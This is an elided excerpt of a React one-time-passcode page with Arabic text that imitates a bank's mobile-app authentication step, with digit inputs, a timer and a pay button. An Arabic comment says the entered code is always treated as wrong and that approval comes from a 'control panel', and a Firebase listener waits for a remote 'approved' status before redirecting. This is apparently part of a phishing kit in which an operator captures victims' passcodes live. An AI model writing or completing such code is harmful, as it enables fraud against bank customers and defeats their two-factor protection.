...
export default function Otp() {
  ...
  useEffect(() => {
    ...
    onValue(appRef, (snap) => {
      const val = snap.val();
      if (val?.status === "approved") navigate("/success");
    });
    return () => off(appRef);
  }, [saved]);
  ...
  async function handlePay() {
    ...
    setLoading(false);
    /* الرمز دائماً خاطئ — الموافقة من لوحة التحكم */
          ...
          <div className="bg-white rounded-2xl shadow-sm overflow-hidden max-w-sm mx-auto">
            ...
            <div className="px-5 py-5">
              <p className="text-center text-sm text-gray-600 leading-relaxed mb-5">
                المصادقة عبر تطبيق الهاتف المتحرك من البنك
                <br />
              ...
              <div className="flex justify-center gap-2.5 mb-3" dir="ltr">
                {digits.map((d, i) => (
                  <input
                    ...
                    className={`w-10 h-12 border rounded-lg text-center text-lg font-bold text-gray-700 focus:outline-none bg-gray-50 transition-colors ${
              ...
              {/* Error */}
              {error && (
                <p className="text-center text-red-500 text-xs font-medium mb-2">{error}</p>
              )}

              {/* Timer */}
              <div className="text-center mb-5">
                <span className={`text-xl font-bold tabular-nums ${seconds <= 30 ? "text-red-500" : "text-gray-800"}`}>
                  {mm}:{ss}
                </span>
                {seconds === 0 && (
                  <p className="text-xs text-red-400 mt-1">انتهت المدة، يرجى المحاولة مجدداً</p>
                )}
              </div>
              ...
              <button
                ...
                className="w-full bg-[#1a2b50] disabled:bg-gray-300 text-white font-bold py-4 rounded-xl text-base tracking-widest hover:bg-[#243b6a] transition-colors flex items-center justify-center gap-2"
              >
                {loading
